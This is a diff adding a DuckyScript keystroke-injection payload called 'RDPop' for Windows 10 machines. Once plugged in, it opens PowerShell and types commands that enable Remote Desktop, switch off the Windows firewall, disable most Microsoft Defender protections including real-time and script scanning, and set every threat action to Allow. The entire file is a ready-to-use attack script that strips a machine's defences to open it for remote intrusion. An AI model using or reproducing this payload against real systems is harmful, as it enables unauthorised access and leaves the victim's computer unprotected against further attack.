@@ -1,0 +1,24 @@
+REM title RDPop
+REM description removes restrictions and enables rdp, if given admin privileges
+REM author C08W38101
+REM target windows 10
+DEFAULT_DELAY 500
+GUI r
+STRING powershell
+ENTER
+STRINGLN Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+STRINGLN Set-NetFirewallProfile -Enabled False
+STRINGLN Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
+STRINGLN Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
+CTRL W
